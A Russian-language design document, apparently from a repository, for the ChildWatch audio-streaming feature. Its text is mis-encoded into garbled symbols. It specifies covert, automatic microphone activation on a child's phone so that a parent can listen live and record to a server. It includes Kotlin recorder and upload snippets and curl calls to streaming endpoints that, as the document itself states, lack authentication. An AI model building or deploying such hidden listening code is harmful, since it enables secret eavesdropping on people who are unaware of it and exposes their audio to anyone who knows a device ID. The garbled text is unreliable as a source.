# üéôÔ∏è –°–∏—Å—Ç–µ–º–∞ –ê—É–¥–∏–æ-–°—Ç—Ä–∏–º–∏–Ω–≥–∞ ChildWatch v3.1.0

## üìã –û–±–∑–æ—Ä

–°–∏—Å—Ç–µ–º–∞ –∞—É–¥–∏–æ-–º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ **–¥–≤—É—Ö —Ä–µ–∂–∏–º–∞—Ö**:

### –ê) üéß –ü—Ä–æ—Å–ª—É—à–∫–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ (–ë–ï–ó –∑–∞–ø–∏—Å–∏)
- **–°–∫—Ä—ã—Ç–Ω–∞—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∞–∫—Ç–∏–≤–∞—Ü–∏—è** –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–µ —Ä–µ–±–µ–Ω–∫–∞
- –†–æ–¥–∏—Ç–µ–ª—å —Å–ª—É—à–∞–µ—Ç –∞—É–¥–∏–æ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
- –ê—É–¥–∏–æ –ù–ï —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
- –ë—É—Ñ–µ—Ä —Ö—Ä–∞–Ω–∏—Ç —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 30 —Å–µ–∫—É–Ω–¥ –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏

### –ë) ‚è∫Ô∏è –ü—Ä–æ—Å–ª—É—à–∫–∞ –° –∑–∞–ø–∏—Å—å—é
- –í–æ –≤—Ä–µ–º—è –ø—Ä–æ—Å–ª—É—à–∫–∏ —Ä–æ–¥–∏—Ç–µ–ª—å –Ω–∞–∂–∏–º–∞–µ—Ç –∫–Ω–æ–ø–∫—É "–ó–∞–ø–∏—Å—å"
- –ê—É–¥–∏–æ –Ω–∞—á–∏–Ω–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω—è—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
- –ü–æ—Å–ª–µ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ - —Ñ–∞–π–ª –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –∏ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è

---

## üèóÔ∏è –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  –†–û–î–ò–¢–ï–õ–¨           ‚îÇ         ‚îÇ  –°–ï–†–í–ï–† (Cloud)     ‚îÇ         ‚îÇ  –†–ï–ë–ï–ù–û–ö            ‚îÇ
‚îÇ  ChildWatch         ‚îÇ         ‚îÇ  Railway/Render     ‚îÇ         ‚îÇ  ParentWatch        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

1. –ù–∞–∂–∏–º–∞–µ—Ç –∫–Ω–æ–ø–∫—É     ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ POST /api/streaming/start
   "–ù–∞—á–∞—Ç—å –ø—Ä–æ—Å–ª—É—à–∫—É"             deviceId: child-3612

                                 –ö–æ–º–∞–Ω–¥–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤ –æ—á–µ—Ä–µ–¥–∏

                                                                2. –ö–∞–∂–¥—ã–µ 30 —Å–µ–∫ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç
                                                                   GET /api/streaming/commands

                                                                3. –ü–æ–ª—É—á–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É START
                                                                   –í–∫–ª—é—á–∞–µ—Ç –º–∏–∫—Ä–æ—Ñ–æ–Ω –°–ö–†–´–¢–ù–û

                                                                4. –ó–∞–ø–∏—Å—ã–≤–∞–µ—Ç –∞—É–¥–∏–æ —á–∞–Ω–∫–∏
                                                                   –ø–æ 2 —Å–µ–∫—É–Ω–¥—ã

                                 ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ POST /api/streaming/chunk
                                                                   + audio file (WebM)

                                 –ë—É—Ñ–µ—Ä: [chunk1, chunk2, ...]
                                 (—Ö—Ä–∞–Ω–∏—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–µ 15 —á–∞–Ω–∫–æ–≤)

5. –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –∞—É–¥–∏–æ   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ GET /api/streaming/chunks
   –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã              deviceId: child-3612

   ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ –û—Ç–¥–∞–µ—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–µ 5 —á–∞–Ω–∫–æ–≤
                       –≤ —Ñ–æ—Ä–º–∞—Ç–µ Base64

6. –í–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç
   –∞—É–¥–∏–æ –≤ —Ä–µ–∞–ª—å–Ω–æ–º
   –≤—Ä–µ–º–µ–Ω–∏

7. (–û–ü–¶–ò–û–ù–ê–õ–¨–ù–û)       ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ POST /api/streaming/record/start
   –ù–∞–∂–∏–º–∞–µ—Ç "‚è∫ –ó–∞–ø–∏—Å—å"

                                 –§–ª–∞–≥ recording = true
                                 –ù–∞—á–∏–Ω–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —á–∞–Ω–∫–∏
                                 –≤ —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫–µ

8. –ü—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Å–ª—É—à–∞—Ç—å  ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ –ß–∞–Ω–∫–∏ –ø—Ä–æ–¥–æ–ª–∂–∞—é—Ç —Å—Ç—Ä–∏–º–∏—Ç—å—Å—è
   + –∑–∞–ø–∏—Å—å –∏–¥–µ—Ç                + —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ —Ñ–∞–π–ª

9. –ù–∞–∂–∏–º–∞–µ—Ç "‚èπ –°—Ç–æ–ø    ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ POST /api/streaming/record/stop
   –∑–∞–ø–∏—Å—å"

                                 –§–∏–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –∞—É–¥–∏–æ —Ñ–∞–π–ª
                                 –°–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö

10. –ù–∞–∂–∏–º–∞–µ—Ç "–°—Ç–æ–ø     ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ POST /api/streaming/stop
    –ø—Ä–æ—Å–ª—É—à–∫—É"

                                 –ö–æ–º–∞–Ω–¥–∞ STOP –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞

                                                                11. –ü–æ–ª—É—á–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É STOP
                                                                    –í—ã–∫–ª—é—á–∞–µ—Ç –º–∏–∫—Ä–æ—Ñ–æ–Ω

                                 –û—á–∏—Å—Ç–∫–∞ –±—É—Ñ–µ—Ä–∞
```

---

## üîß –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–µ—Ç–∞–ª–∏

### –§–æ—Ä–º–∞—Ç –∞—É–¥–∏–æ:
- **–ö–æ–¥–µ–∫**: WebM (Opus)
- **–†–∞–∑–º–µ—Ä —á–∞–Ω–∫–∞**: ~2 —Å–µ–∫—É–Ω–¥—ã (~50-100 KB)
- **Sample rate**: 44100 Hz
- **Bitrate**: 64 kbps (–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è –≥–æ–ª–æ—Å–∞)

### –°–µ—Ä–≤–µ—Ä–Ω—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã:

#### 1. **CommandManager** (`managers/CommandManager.js`)
- –£–ø—Ä–∞–≤–ª—è–µ—Ç –æ—á–µ—Ä–µ–¥—å—é –∫–æ–º–∞–Ω–¥ –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤
- –•—Ä–∞–Ω–∏—Ç –∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ —Å—Ç—Ä–∏–º–∏–Ω–≥–∞
- –ë—É—Ñ–µ—Ä–∏–∑–∏—Ä—É–µ—Ç –∞—É–¥–∏–æ-—á–∞–Ω–∫–∏
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—á–∏—â–∞–µ—Ç —Å—Ç–∞—Ä—ã–µ —Å–µ—Å—Å–∏–∏

#### 2. **Streaming Routes** (`routes/streaming.js`)

**–≠–Ω–¥–ø–æ–∏–Ω—Ç—ã:**

##### –î–ª—è —Ä–æ–¥–∏—Ç–µ–ª—è (ChildWatch):
```
POST /api/streaming/start
Body: { deviceId: "child-3612", parentId: "parent-xyz" }
‚Üí –ó–∞–ø—É—Å–∫–∞–µ—Ç –ø—Ä–æ—Å–ª—É—à–∫—É

POST /api/streaming/stop
Body: { deviceId: "child-3612" }
‚Üí –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø—Ä–æ—Å–ª—É—à–∫—É

POST /api/streaming/record/start
Body: { deviceId: "child-3612" }
‚Üí –ù–∞—á–∏–Ω–∞–µ—Ç –∑–∞–ø–∏—Å—å –≤–æ –≤—Ä–µ–º—è –ø—Ä–æ—Å–ª—É—à–∫–∏

POST /api/streaming/record/stop
Body: { deviceId: "child-3612" }
‚Üí –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –∑–∞–ø–∏—Å—å

GET /api/streaming/chunks/:deviceId?count=5
‚Üí –ü–æ–ª—É—á–∞–µ—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–µ 5 –∞—É–¥–∏–æ-—á–∞–Ω–∫–æ–≤ –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è

GET /api/streaming/status/:deviceId
‚Üí –°—Ç–∞—Ç—É—Å —Å–µ—Å—Å–∏–∏ (streaming, recording, duration)
```

##### –î–ª—è —Ä–µ–±–µ–Ω–∫–∞ (ParentWatch):
```
GET /api/streaming/commands/:deviceId
‚Üí –ü–æ–ª—É—á–∞–µ—Ç pending –∫–æ–º–∞–Ω–¥—ã (start/stop stream/record)

POST /api/streaming/chunk
Multipart: audio file + deviceId + sequence + recording flag
‚Üí –ó–∞–≥—Ä—É–∂–∞–µ—Ç –∞—É–¥–∏–æ-—á–∞–Ω–∫ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
```

---

## üì± –ö–ª–∏–µ–Ω—Ç—Å–∫–∞—è —á–∞—Å—Ç—å (TODO - —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è)

### ParentWatch (—Ç–µ–ª–µ—Ñ–æ–Ω —Ä–µ–±–µ–Ω–∫–∞) - –ù–£–ñ–ù–û –î–û–†–ê–ë–û–¢–ê–¢–¨:

**–ß—Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å:**

1. **–§–æ–Ω–æ–≤—ã–π —Å–µ—Ä–≤–∏—Å –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–º–∞–Ω–¥**
   ```kotlin
   // –í LocationService.kt –¥–æ–±–∞–≤–∏—Ç—å:
   class LocationService {
       private fun checkStreamingCommands() {
           // –ö–∞–∂–¥—ã–µ 30 —Å–µ–∫ –ø—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–º–∞–Ω–¥—ã
           val response = networkHelper.getStreamingCommands(deviceId)

           for (command in response.commands) {
               when (command.type) {
                   "start_audio_stream" -> startAudioStreaming()
                   "stop_audio_stream" -> stopAudioStreaming()
                   "start_recording" -> isRecording = true
                   "stop_recording" -> isRecording = false
               }
           }
       }
   }
   ```

2. **–ê—É–¥–∏–æ-—Ä–µ–∫–æ—Ä–¥–µ—Ä —Å —á–∞–Ω–∫–∞–º–∏**
   ```kotlin
   class AudioStreamRecorder {
       private val mediaRecorder = MediaRecorder()

       fun startStreaming(deviceId: String) {
           // –ù–∞—Å—Ç—Ä–æ–π–∫–∞: WebM, Opus, 64kbps
           mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
           mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.WEBM)
           mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS)

           // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —á–∞–Ω–∫–∏ –ø–æ 2 —Å–µ–∫—É–Ω–¥—ã
           Timer().scheduleAtFixedRate(2000) {
               val chunk = recordChunk()
               uploadChunk(chunk, deviceId, sequence++, isRecording)
           }
       }
   }
   ```

3. **–ó–∞–≥—Ä—É–∑–∫–∞ —á–∞–Ω–∫–æ–≤**
   ```kotlin
   suspend fun uploadChunk(
       chunk: ByteArray,
       deviceId: String,
       sequence: Int,
       recording: Boolean
   ) {
       val requestBody = chunk.toRequestBody("audio/webm".toMediaType())

       api.uploadAudioChunk(
           deviceId = deviceId,
           sequence = sequence,
           recording = recording.toString(),
           audio = MultipartBody.Part.createFormData("audio", "chunk.webm", requestBody)
       )
   }
   ```

### ChildWatch (—Ç–µ–ª–µ—Ñ–æ–Ω —Ä–æ–¥–∏—Ç–µ–ª—è) - –ù–£–ñ–ù–û –î–û–†–ê–ë–û–¢–ê–¢–¨:

**–ß—Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å:**

1. **–ö–Ω–æ–ø–∫–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤ AudioActivity**
   ```xml
   <!-- activity_audio.xml -->
   <Button
       android:id="@+id/startStreamButton"
       android:text="üéß –ù–∞—á–∞—Ç—å –ø—Ä–æ—Å–ª—É—à–∫—É" />

   <Button
       android:id="@+id/recordToggleButton"
       android:text="‚è∫ –ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å"
       android:enabled="false" />

   <Button
       android:id="@+id/stopStreamButton"
       android:text="‚èπ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å"
       android:enabled="false" />
   ```

2. **–õ–æ–≥–∏–∫–∞ –≤ AudioActivity.kt**
   ```kotlin
   private fun startStreaming() {
       lifecycleScope.launch {
           // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä
           val response = networkClient.startAudioStream(childDeviceId)

           if (response.success) {
               isStreaming = true
               recordToggleButton.isEnabled = true

               // –ù–∞—á–∏–Ω–∞–µ–º –ø–æ–ª—É—á–∞—Ç—å –∏ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—å —á–∞–Ω–∫–∏
               startPlaybackLoop()
           }
       }
   }

   private fun startPlaybackLoop() {
       playbackJob = lifecycleScope.launch {
           while (isStreaming) {
               val chunks = networkClient.getAudioChunks(childDeviceId, count = 5)

               for (chunk in chunks) {
                   playAudioChunk(chunk.data) // Base64 ‚Üí ByteArray ‚Üí AudioTrack
               }

               delay(2000) // –ö–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã
           }
       }
   }

   private fun toggleRecording() {
       if (!isRecording) {
           networkClient.startRecording(childDeviceId)
           isRecording = true
           recordToggleButton.text = "‚èπ –°—Ç–æ–ø –∑–∞–ø–∏—Å—å"
       } else {
           networkClient.stopRecording(childDeviceId)
           isRecording = false
           recordToggleButton.text = "‚è∫ –ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å"
       }
   }
   ```

3. **–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∞—É–¥–∏–æ**
   ```kotlin
   private fun playAudioChunk(base64Data: String) {
       val audioData = Base64.decode(base64Data, Base64.DEFAULT)

       // –ò—Å–ø–æ–ª—å–∑—É–µ–º AudioTrack –¥–ª—è low-latency –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è
       audioTrack.write(audioData, 0, audioData.size)
   }
   ```

---

## ‚òÅÔ∏è –û–ë–õ–ê–ß–ù–´–ô –î–ï–ü–õ–û–ô

### –í–∞—Ä–∏–∞–Ω—Ç 1: Railway.app (–†–ï–ö–û–ú–ï–ù–î–£–ï–¢–°–Ø)

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–π –ø–ª–∞–Ω: 500 —á–∞—Å–æ–≤/–º–µ—Å—è—Ü
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π SSL (HTTPS)
- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π –¥–µ–ø–ª–æ–π –∏–∑ GitHub
- ‚úÖ PostgreSQL –±–µ—Å–ø–ª–∞—Ç–Ω–æ –≤–∫–ª—é—á–µ–Ω
- ‚úÖ Public URL –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

**–®–∞–≥–∏ –¥–µ–ø–ª–æ—è:**

1. **–°–æ–∑–¥–∞–π—Ç–µ –∞–∫–∫–∞—É–Ω—Ç –Ω–∞ [Railway.app](https://railway.app)**

2. **–ü–æ–¥–∫–ª—é—á–∏—Ç–µ GitHub —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π:**
   - New Project ‚Üí Deploy from GitHub
   - –í—ã–±–µ—Ä–∏—Ç–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π ChildWatch

3. **–ù–∞—Å—Ç—Ä–æ–π—Ç–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è:**
   ```
   PORT=3000
   NODE_ENV=production
   DATABASE_URL=(–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–æ–∑–¥–∞–µ—Ç—Å—è Railway)
   ```

4. **–î–µ–ø–ª–æ–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π!**
   - –ü—Ä–∏ –∫–∞–∂–¥–æ–º push –≤ GitHub ‚Üí –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–µ–ø–ª–æ–∏—Ç—Å—è
   - –ü–æ–ª—É—á–∏—Ç–µ URL: `https://childwatch.up.railway.app`

5. **–í –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö —É–∫–∞–∂–∏—Ç–µ –Ω–æ–≤—ã–π URL:**
   ```
   ParentWatch: URL —Å–µ—Ä–≤–µ—Ä–∞ = https://childwatch.up.railway.app
   ChildWatch: –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚Üí URL —Å–µ—Ä–≤–µ—Ä–∞ = https://childwatch.up.railway.app
   ```

### –í–∞—Ä–∏–∞–Ω—Ç 2: Render.com

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ü–æ–ª–Ω–æ—Å—Ç—å—é –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –ø–ª–∞–Ω (—Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è–º–∏)
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π SSL
- ‚úÖ PostgreSQL –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏:**
- ‚ö†Ô∏è "–°–ø–∏—Ç" –ø–æ—Å–ª–µ 15 –º–∏–Ω—É—Ç –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
- ‚ö†Ô∏è –ü–µ—Ä–≤—ã–π –∑–∞–ø—Ä–æ—Å –º–µ–¥–ª–µ–Ω–Ω—ã–π (~30 —Å–µ–∫)

**–®–∞–≥–∏:**
1. –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –Ω–∞ [Render.com](https://render.com)
2. New ‚Üí Web Service ‚Üí Connect GitHub
3. Build Command: `npm install`
4. Start Command: `npm start`
5. Plan: Free

### –í–∞—Ä–∏–∞–Ω—Ç 3: Fly.io

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–π –ø–ª–∞–Ω –¥–ª—è –º–∞–ª–µ–Ω—å–∫–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
- ‚úÖ –û—á–µ–Ω—å –±—ã—Å—Ç—Ä—ã–π (edge network)

**–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏:**
- ‚ö†Ô∏è –°–ª–æ–∂–Ω–µ–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å

---

## üîê –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å

**–í–ê–ñ–ù–û –¥–ª—è –ø—Ä–æ–¥–∞–∫—à–µ–Ω–∞:**

1. **–î–æ–±–∞–≤—å—Ç–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –∫ streaming endpoints**
2. **–û–≥—Ä–∞–Ω–∏—á—å—Ç–µ —á–∞—Å—Ç–æ—Ç—É –∑–∞–ø—Ä–æ—Å–æ–≤ (rate limiting —É–∂–µ –µ—Å—Ç—å)**
3. **–®–∏—Ñ—Ä—É–π—Ç–µ –∞—É–¥–∏–æ-—á–∞–Ω–∫–∏ (SSL —É–∂–µ –µ—Å—Ç—å –Ω–∞ Railway)**
4. **–õ–æ–≥–∏—Ä—É–π—Ç–µ –≤—Å–µ —Å–µ—Å—Å–∏–∏ –ø—Ä–æ—Å–ª—É—à–∫–∏**

---

## üìä –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

**Railway –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç:**
- –õ–æ–≥–∏ —Å–µ—Ä–≤–µ—Ä–∞ (—Ä–µ–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è)
- –ú–µ—Ç—Ä–∏–∫–∏ CPU/RAM
- –°—Ç–∞—Ç—É—Å –¥–µ–ø–ª–æ—è
- Rollback –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –≤–µ—Ä—Å–∏–∏

---

## üöÄ –°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏

### –°–µ—Ä–≤–µ—Ä–Ω–∞—è —á–∞—Å—Ç—å: ‚úÖ –ì–û–¢–û–í–û
- ‚úÖ CommandManager
- ‚úÖ Streaming routes
- ‚úÖ –ë—É—Ñ–µ—Ä–∏–∑–∞—Ü–∏—è —á–∞–Ω–∫–æ–≤
- ‚úÖ Railway –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è

### –ö–ª–∏–µ–Ω—Ç—Å–∫–∞—è —á–∞—Å—Ç—å: ‚ö†Ô∏è –¢–†–ï–ë–£–ï–¢–°–Ø –î–û–†–ê–ë–û–¢–ö–ê

**ParentWatch (—Ä–µ–±–µ–Ω–æ–∫):**
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É –∫–æ–º–∞–Ω–¥ –≤ LocationService
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å AudioStreamRecorder
- [ ] –î–æ–±–∞–≤–∏—Ç—å –∑–∞–≥—Ä—É–∑–∫—É —á–∞–Ω–∫–æ–≤

**ChildWatch (—Ä–æ–¥–∏—Ç–µ–ª—å):**
- [ ] –û–±–Ω–æ–≤–∏—Ç—å AudioActivity UI
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å NetworkClient –º–µ—Ç–æ–¥—ã –¥–ª—è streaming
- [ ] –î–æ–±–∞–≤–∏—Ç—å –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∞—É–¥–∏–æ-—á–∞–Ω–∫–æ–≤
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å toggle recording

---

## üí° –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 1: –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π MVP**
1. –†–µ–∞–ª–∏–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –ø—Ä–æ—Å–ª—É—à–∫—É –ë–ï–ó –∑–∞–ø–∏—Å–∏
2. –¢–µ—Å—Ç–∏—Ä—É–π—Ç–µ –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ
3. –ó–∞—Ç–µ–º –¥–µ–ø–ª–æ–π –Ω–∞ Railway
4. –¢–µ—Å—Ç–∏—Ä—É–π—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 2: –î–æ–±–∞–≤—å—Ç–µ –∑–∞–ø–∏—Å—å**
1. –î–æ–±–∞–≤—å—Ç–µ –∫–Ω–æ–ø–∫—É –∑–∞–ø–∏—Å–∏
2. –†–µ–∞–ª–∏–∑—É–π—Ç–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —á–∞–Ω–∫–æ–≤
3. –î–æ–±–∞–≤—å—Ç–µ —Å–ø–∏—Å–æ–∫ –∑–∞–ø–∏—Å–µ–π

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 3: –ü–æ–ª–∏—Ä–æ–≤–∫–∞**
1. –£–ª—É—á—à–∏—Ç–µ UI
2. –î–æ–±–∞–≤—å—Ç–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–∞—á–µ—Å—Ç–≤–∞ —Å–≤—è–∑–∏
3. –û–ø—Ç–∏–º–∏–∑–∏—Ä—É–π—Ç–µ battery usage

---

## üìù API –ü—Ä–∏–º–µ—Ä—ã

### –ó–∞–ø—É—Å–∫ –ø—Ä–æ—Å–ª—É—à–∫–∏ (curl):
```bash
curl -X POST https://childwatch.up.railway.app/api/streaming/start \
  -H "Content-Type: application/json" \
  -d '{"deviceId":"child-3612","parentId":"parent-001"}'
```

### –ü–æ–ª—É—á–µ–Ω–∏–µ —á–∞–Ω–∫–æ–≤:
```bash
curl https://childwatch.up.railway.app/api/streaming/chunks/child-3612?count=5
```

### –°—Ç–∞—Ç—É—Å —Å–µ—Å—Å–∏–∏:
```bash
curl https://childwatch.up.railway.app/api/streaming/status/child-3612
```

---

## ‚ùì FAQ

